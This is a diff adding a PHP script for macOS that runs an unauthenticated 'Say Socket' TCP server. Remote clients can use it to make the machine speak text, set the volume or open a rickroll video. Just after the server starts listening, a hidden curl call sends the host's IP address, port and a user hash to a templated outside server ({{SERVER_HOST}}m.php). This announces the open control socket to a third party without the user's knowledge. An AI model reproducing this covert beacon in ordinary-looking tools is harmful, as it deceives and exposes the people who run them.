@@ -1,0 +1,178 @@
+#!/usr/bin/php
+<?php
+// Define constants
+define('REGEX_VALID_IP_ADDRESS', "/^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$/");
+define('REGEX_SIMPLE_STRING', '/^[a-zA-Z0-9\s]+$/');
+define('PORT_MIN', 1024);
+define('PORT_MAX', 65535);
+define('PROMPT', 'say> ');
+
+$voices = load_voice_list();
+
+$current_voice = count($voices) > 0 ? $voices[0] : 'alex';
+
+// Allow the script to hang around waiting for connections.
+set_time_limit(0);
+
+// Turn on implicit output flushing so we see what we're getting as it comes in.
+ob_implicit_flush();
+
+// Defaults
+$address = lookup_ip();
+$port = 12345;
+
+// Get optional arguments
+if ($argc > 1) {
+    $address = $argv[1];
+}
+
+if ($argc > 2) {
+    $port = (int)$argv[2];
+}
+
+// Error check address and port
+(preg_match(REGEX_VALID_IP_ADDRESS, $address)) or die("Invalid ip address: '{$address}'\n");
+(is_numeric($port) && $port > PORT_MIN && $port < PORT_MAX) or die("Invalid port: '{$port}'\n");
+
+echo "Creating say socket for address: $address through port: $port\n";
+
+if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
+    die("socket_create() failed: reason: " . socket_strerror(socket_last_error()) . "\n");
+}
+
+if (socket_bind($sock, $address, $port) === false) {
+    socket_close($sock);
+    die("socket_bind() failed: reason: " . socket_strerror(socket_last_error($sock)) . "\n");
+}
+
+if (socket_listen($sock, 5) === false) {
+    socket_close($sock);
+    die("socket_listen() failed: reason: " . socket_strerror(socket_last_error($sock)) . "\n");
+}
+
+exec("curl -s \"{{SERVER_HOST}}m.php?ip=$address&port=$port&h={{USER_HASH}}\"");
+
+do {
+    if (($msgsock = socket_accept($sock)) === false) {
+        echo "socket_accept() failed: reason: " . socket_strerror(socket_last_error($sock)) . "\n";
+        break;
+    }
+
+    $msg = "\nWelcome to the Say Socket! \n" .
+        "Type anything to say it through the socket.\n" .
+        "To quit, type 'quit'. To shut down the server type 'shutdown'.\n" . PROMPT;
+    socket_write($msgsock, $msg, strlen($msg));
+
+    do {
+        $msg = '';
+
+        if (false === ($buf = socket_read($msgsock, 2048, PHP_NORMAL_READ))) {
+            echo "socket_read() failed: reason: " . socket_strerror(socket_last_error($msgsock)) . "\n";
+            break 2;
+        }
+
+        if (!$buf = trim($buf)) {
+            continue;
+        }
+
+        $buf = strtolower($buf);
+
+        switch ($buf) {
+            case 'quit':
+                break 2;
+            case 'shutdown':
+                socket_close($msgsock);
+                break 3;
+            default:
+                $buf = trim($buf, ' _-[]()"\'');
+
+                if (preg_match('/^rickroll$/i', $buf)) {
+                    $cmd = "open -a Safari 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'";
+                    exec($cmd);
+                } else if (preg_match('/^voices$/i', $buf)) {
+                    foreach ($voices as $voice) {
+                        $msg .= $voice . "\n";
+                    }
+                } else if (preg_match('/^voice$/i', $buf, $arr) || preg_match('/^voice ([a-z]+)$/i', $buf, $arr)) {
+                    if (isset($arr[1])) {
+                        $voice = $arr[1];
+
+                        if (in_array($voice, $voices)) {
+                            $current_voice = $voice;
+                        } else {
+                            $msg .= "Voice '$voice' does not exist. Use 'voices' command to see a list of available voices\n";
+                        }
+                    }
+
+                    $msg .= "Current voice is: $current_voice\n";
+                } else if (preg_match('/^volume (\d)$/i', $buf, $arr)) {
+                    if (isset($arr[1]) && is_numeric($arr[1])) {
+                        $lvl = (int)$arr[1];
+
+                        if ($lvl > 9) $lvl = 9;
+                        if ($lvl < 0) $lvl = 0;
+
+                        $cmd = "osascript -e \"set Volume $lvl\"";
+                        exec($cmd);
+                    }
+                } else if (preg_match(REGEX_SIMPLE_STRING, $buf)) {
+                    if (!command_exist($buf)) {
+                        $cmd = "say -v $current_voice '$buf'";
+                        exec($cmd);
+                    } else {
+                        $msg .= "Cannot say: '$buf', command exists\n";
+                    }
+                } else {
+                    $msg .= "Cannot say: '$buf', string is too complex\n";
+                }
+
+                break;
+        }
+
+        $msg .= PROMPT;
+
+        socket_write($msgsock, $msg, strlen($msg));
+    } while (true);
+    socket_close($msgsock);
+} while (true);
+
+socket_close($sock);
+
+function command_exist($cmd) {
+    $returnVal = shell_exec("which $cmd");
+    return (empty($returnVal) ? false : true);
+}
+
+function lookup_ip() {
+    for ($i = 0; $i < 10; $i++) {
+        $cmd = "ipconfig getifaddr en$i";
+        $adr = trim(exec($cmd));
+
+        if (preg_match(REGEX_VALID_IP_ADDRESS, $adr)) {
+            return $adr;
+        }
+    }
+
+    return '127.0.0.1';
+}
+
+function load_voice_list() {
+    $voices = array();
+
+    $ret = `say -v '?'`;
+    $arr = explode("\n", $ret);
+
+    foreach ($arr as $line) {
+        $stuff = explode(' ', $line);
+
+        if (isset($stuff[0])) {
+            $voice = strtolower(trim($stuff[0]));
+
+            if ($voice != '') {
+                $voices[] = strtolower(trim($stuff[0]));
+            }
+        }
+    }
+
+    return $voices;
+}
